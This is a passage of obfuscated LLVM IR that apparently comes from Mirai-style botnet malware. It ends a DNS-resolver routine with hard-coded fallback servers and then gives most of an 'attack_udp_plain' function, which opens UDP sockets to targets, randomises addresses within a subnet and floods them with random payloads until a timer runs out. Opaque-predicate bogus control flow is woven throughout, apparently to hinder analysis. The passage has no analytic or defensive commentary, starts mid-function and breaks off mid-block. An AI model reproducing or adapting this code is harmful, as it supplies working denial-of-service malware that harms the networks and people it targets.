  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %108, label %117, label %131

; <label>:117:                                    ; preds = %originalBBpart28, %92, %88
  %118 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %119 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %120 = load i32, i32* %4, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  %123 = load i32, i32* %6, align 4
  %124 = load i32, i32* %4, align 4
  %125 = sub nsw i32 %123, %124
  call void @util_memcpy(i8* %118, i8* %122, i32 %125)
  %126 = load i32, i32* %6, align 4
  %127 = load i32, i32* %4, align 4
  %128 = sub nsw i32 %126, %127
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %129
  store i8 0, i8* %130, align 1
  store i8 1, i8* %9, align 1
  br label %135

; <label>:131:                                    ; preds = %originalBBpart28
  br label %132

; <label>:132:                                    ; preds = %131, %65
  %133 = load i32, i32* %6, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %6, align 4
  br label %46

; <label>:135:                                    ; preds = %117, %46
  %136 = load i8, i8* %9, align 1
  %137 = icmp ne i8 %136, 0
  br i1 %137, label %138, label %141

; <label>:138:                                    ; preds = %135
  %139 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %140 = call i32 @inet_addr(i8* %139) #6
  store i32 %140, i32* %1, align 4
  br label %186

; <label>:141:                                    ; preds = %135
  br label %142

; <label>:142:                                    ; preds = %141, %originalBBpart2
  br label %143

; <label>:143:                                    ; preds = %142, %0
  %144 = call i32 @rand_next()
  %145 = urem i32 %144, 4
  switch i32 %145, label %186 [
    i32 0, label %146
    i32 1, label %148
    i32 2, label %166
    i32 3, label %184
  ]

; <label>:146:                                    ; preds = %143
  %147 = call i32 @htonl(i32 134744072) #7
  store i32 %147, i32* %1, align 4
  br label %186

; <label>:148:                                    ; preds = %143
  %149 = load i32, i32* @x.33
  %150 = load i32, i32* @y.34
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %148
  %157 = call i32 @htonl(i32 1246898730) #7
  store i32 %157, i32* %1, align 4
  %158 = load i32, i32* @x.33
  %159 = load i32, i32* @y.34
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %186

; <label>:166:                                    ; preds = %143
  %167 = load i32, i32* @x.33
  %168 = load i32, i32* @y.34
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %166
  %175 = call i32 @htonl(i32 1074151430) #7
  store i32 %175, i32* %1, align 4
  %176 = load i32, i32* @x.33
  %177 = load i32, i32* @y.34
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %186

; <label>:184:                                    ; preds = %143
  %185 = call i32 @htonl(i32 67240450) #7
  store i32 %185, i32* %1, align 4
  br label %186

; <label>:186:                                    ; preds = %184, %originalBBpart216, %originalBBpart212, %146, %143, %138
  %187 = load i32, i32* %1, align 4
  ret i32 %187

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %188 = load i32, i32* %2, align 4
  %189 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %190 = call i64 @read(i32 %188, i8* %189, i64 2048)
  %191 = trunc i64 %190 to i32
  store i32 %191, i32* %3, align 4
  %192 = load i32, i32* %2, align 4
  %193 = call i32 @close(i32 %192)
  call void @table_unlock_val(i8 zeroext 38)
  %194 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %195 = load i32, i32* %3, align 4
  %196 = call i8* @table_retrieve_val(i32 38, i32* null)
  %197 = call i32 @util_stristr(i8* %194, i32 %195, i8* %196)
  store i32 %197, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %198 = load i32, i32* %4, align 4
  %199 = icmp ne i32 %198, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %68
  %200 = load i8, i8* %10, align 1
  %201 = sext i8 %200 to i32
  %202 = icmp ne i32 %201, 46
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %96
  %203 = load i32, i32* %6, align 4
  %204 = load i32, i32* %3, align 4
  %_ = shl i32 %204, 1
  %205 = sub nsw i32 %204, 1
  %206 = icmp eq i32 %203, %205
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %148
  %207 = call i32 @htonl(i32 1246898730) #7
  store i32 %207, i32* %1, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %166
  %208 = call i32 @htonl(i32 1074151430) #7
  store i32 %208, i32* %1, align 4
  br label %originalBB14
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = trunc i64 %54 to i32
  store i32 %55, i32* %19, align 4
  %56 = load i16, i16* %15, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  br i1 %58, label %59, label %78

; <label>:59:                                     ; preds = %5
  %60 = load i32, i32* @x.35
  %61 = load i32, i32* @y.36
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %59
  %68 = call i32 @rand_next()
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %15, align 2
  %70 = load i32, i32* @x.35
  %71 = load i32, i32* @y.36
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %81

; <label>:78:                                     ; preds = %5
  %79 = load i16, i16* %15, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %79) #7
  store i16 %80, i16* %15, align 2
  br label %81

; <label>:81:                                     ; preds = %78, %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %82

; <label>:82:                                     ; preds = %274, %81
  %83 = load i32, i32* @x.35
  %84 = load i32, i32* @y.36
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %82
  %91 = load i32, i32* %11, align 4
  %92 = load i8, i8* %7, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %91, %93
  %95 = load i32, i32* @x.35
  %96 = load i32, i32* @y.36
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %94, label %103, label %277

; <label>:103:                                    ; preds = %originalBBpart24
  %104 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %105 = load i8**, i8*** %12, align 8
  %106 = load i32, i32* %11, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8*, i8** %105, i64 %107
  store i8* %104, i8** %108, align 8
  %109 = load i16, i16* %14, align 2
  %110 = zext i16 %109 to i32
  %111 = icmp eq i32 %110, 65535
  br i1 %111, label %112, label %121

; <label>:112:                                    ; preds = %103
  %113 = call i32 @rand_next()
  %114 = trunc i32 %113 to i16
  %115 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i64 %117
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i32 0, i32 0
  %120 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %119, i32 0, i32 1
  store i16 %114, i16* %120, align 2
  br label %130

; <label>:121:                                    ; preds = %103
  %122 = load i16, i16* %14, align 2
  %123 = call zeroext i16 @htons(i16 zeroext %122) #7
  %124 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %125 = load i32, i32* %11, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 0
  %129 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %128, i32 0, i32 1
  store i16 %123, i16* %129, align 2
  br label %130

; <label>:130:                                    ; preds = %121, %112
  %131 = load i32, i32* @x.35
  %132 = load i32, i32* @y.36
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %130
  %139 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %140 = load i32*, i32** %13, align 8
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i32, i32* %140, i64 %142
  store i32 %139, i32* %143, align 4
  %144 = icmp eq i32 %139, -1
  %145 = load i32, i32* @x.35
  %146 = load i32, i32* @y.36
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %144, label %153, label %170

; <label>:153:                                    ; preds = %originalBBpart28
  %154 = load i32, i32* @x.35
  %155 = load i32, i32* @y.36
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %153
  %162 = load i32, i32* @x.35
  %163 = load i32, i32* @y.36
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %432

; <label>:170:                                    ; preds = %originalBBpart28
  %171 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %171, align 4
  %172 = load i16, i16* %15, align 2
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %172, i16* %173, align 2
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  store i32 0, i32* %175, align 4
  %176 = load i32*, i32** %13, align 8
  %177 = load i32, i32* %11, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i32, i32* %176, i64 %178
  %180 = load i32, i32* %179, align 4
  %181 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %182 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %182, %struct.sockaddr** %181, align 8
  %183 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %184 = load %struct.sockaddr*, %struct.sockaddr** %183, align 8
  %185 = call i32 @bind(i32 %180, %struct.sockaddr* %184, i32 16) #6
  %186 = icmp eq i32 %185, -1
  br i1 %186, label %187, label %188

; <label>:187:                                    ; preds = %170
  br label %188

; <label>:188:                                    ; preds = %187, %170
  %189 = load i32, i32* @x.35
  %190 = load i32, i32* @y.36
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %188
  %197 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %198 = load i32, i32* %11, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i8, i8* %201, align 4
  %203 = zext i8 %202 to i32
  %204 = icmp slt i32 %203, 32
  %205 = load i32, i32* @x.35
  %206 = load i32, i32* @y.36
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %204, label %213, label %239

; <label>:213:                                    ; preds = %originalBBpart216
  %214 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %215 = load i32, i32* %11, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i32 0, i32 1
  %219 = load i32, i32* %218, align 4
  %220 = call i32 @ntohl(i32 %219) #7
  %221 = call i32 @rand_next()
  %222 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %223 = load i32, i32* %11, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 2
  %227 = load i8, i8* %226, align 4
  %228 = zext i8 %227 to i32
  %229 = lshr i32 %221, %228
  %230 = add i32 %220, %229
  %231 = call i32 @htonl(i32 %230) #7
  %232 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %233 = load i32, i32* %11, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %235, i32 0, i32 0
  %237 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %236, i32 0, i32 2
  %238 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %237, i32 0, i32 0
  store i32 %231, i32* %238, align 4
  br label %239

; <label>:239:                                    ; preds = %213, %originalBBpart216
  %240 = load i32*, i32** %13, align 8
  %241 = load i32, i32* %11, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds i32, i32* %240, i64 %242
  %244 = load i32, i32* %243, align 4
  %245 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %246 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %247 = load i32, i32* %11, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %246, i64 %248
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %249, i32 0, i32 0
  %251 = bitcast %struct.sockaddr_in* %250 to %struct.sockaddr*
  store %struct.sockaddr* %251, %struct.sockaddr** %245, align 8
  %252 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %253 = load %struct.sockaddr*, %struct.sockaddr** %252, align 8
  %254 = call i32 @connect(i32 %244, %struct.sockaddr* %253, i32 16)
  %255 = icmp eq i32 %254, -1
  br i1 %255, label %256, label %273

; <label>:256:                                    ; preds = %239
  %257 = load i32, i32* @x.35
  %258 = load i32, i32* @y.36
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %256
  %265 = load i32, i32* @x.35
  %266 = load i32, i32* @y.36
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %273

; <label>:273:                                    ; preds = %originalBBpart220, %239
  br label %274

; <label>:274:                                    ; preds = %273
  %275 = load i32, i32* %11, align 4
  %276 = add nsw i32 %275, 1
  store i32 %276, i32* %11, align 4
  br label %82

; <label>:277:                                    ; preds = %originalBBpart24
  %278 = load i32, i32* @x.35
  %279 = load i32, i32* @y.36
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %277
  %286 = load i32, i32* @x.35
  %287 = load i32, i32* @y.36
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %294

; <label>:294:                                    ; preds = %originalBBpart248, %originalBBpart224
  store i32 0, i32* %11, align 4
  br label %295

; <label>:295:                                    ; preds = %390, %294
  %296 = load i32, i32* @x.35
  %297 = load i32, i32* @y.36
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %295
  %304 = load i32, i32* %11, align 4
  %305 = load i8, i8* %7, align 1
  %306 = zext i8 %305 to i32
  %307 = icmp slt i32 %304, %306
  %308 = load i32, i32* @x.35
  %309 = load i32, i32* @y.36
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %307, label %316, label %393

; <label>:316:                                    ; preds = %originalBBpart228
  %317 = load i32, i32* @x.35
  %318 = load i32, i32* @y.36
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %316
  %325 = load i8**, i8*** %12, align 8
  %326 = load i32, i32* %11, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds i8*, i8** %325, i64 %327
  %329 = load i8*, i8** %328, align 8
  store i8* %329, i8** %25, align 8
  %330 = load i8, i8* %17, align 1
  %331 = icmp ne i8 %330, 0
  %332 = load i32, i32* @x.35
  %333 = load i32, i32* @y.36
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %331, label %340, label %364

; <label>:340:                                    ; preds = %originalBBpart232
  %341 = load i32, i32* @x.35
  %342 = load i32, i32* @y.36
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %340
  %349 = load i8*, i8** %25, align 8
  %350 = load i16, i16* %16, align 2
  %351 = zext i16 %350 to i32
  call void @rand_alpha_str(i8* %349, i32 %351)
  %352 = load i8*, i8** %25, align 8
  %353 = load i16, i16* %16, align 2
  %354 = zext i16 %353 to i64
  %355 = getelementptr inbounds i8, i8* %352, i64 %354
  store i8 0, i8* %355, align 1
  %356 = load i32, i32* @x.35
  %357 = load i32, i32* @y.36
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %364

; <label>:364:                                    ; preds = %originalBBpart236, %originalBBpart232
  %365 = load i32, i32* @x.35
  %366 = load i32, i32* @y.36
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %364
  %373 = load i32*, i32** %13, align 8
  %374 = load i32, i32* %11, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds i32, i32* %373, i64 %375
  %377 = load i32, i32* %376, align 4
  %378 = load i8*, i8** %25, align 8
  %379 = load i16, i16* %16, align 2
  %380 = zext i16 %379 to i64
  %381 = call i64 @send(i32 %377, i8* %378, i64 %380, i32 16384)
  %382 = load i32, i32* @x.35
  %383 = load i32, i32* @y.36
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %390

; <label>:390:                                    ; preds = %originalBBpart240
  %391 = load i32, i32* %11, align 4
  %392 = add nsw i32 %391, 1
  store i32 %392, i32* %11, align 4
  br label %295

; <label>:393:                                    ; preds = %originalBBpart228
  %394 = load i32, i32* @x.35
  %395 = load i32, i32* @y.36
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %393
  %402 = call i64 @time(i64* null) #6
  %403 = load i32, i32* %19, align 4
  %404 = sext i32 %403 to i64
  %405 = icmp sgt i64 %402, %404
  %406 = load i32, i32* @x.35
  %407 = load i32, i32* @y.36
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %405, label %414, label %415

; <label>:414:                                    ; preds = %originalBBpart244
  br label %432

; <label>:415:                                    ; preds = %originalBBpart244
  %416 = load i32, i32* @x.35
  %417 = load i32, i32* @y.36
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %415
  %424 = load i32, i32* @x.35
  %425 = load i32, i32* @y.36
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %294

; <label>:432:                                    ; preds = %414, %originalBBpart212
  %433 = load i32, i32* @x.35
  %434 = load i32, i32* @y.36
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %432
  %441 = load i32, i32* @x.35
  %442 = load i32, i32* @y.36
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %59
  %449 = call i32 @rand_next()
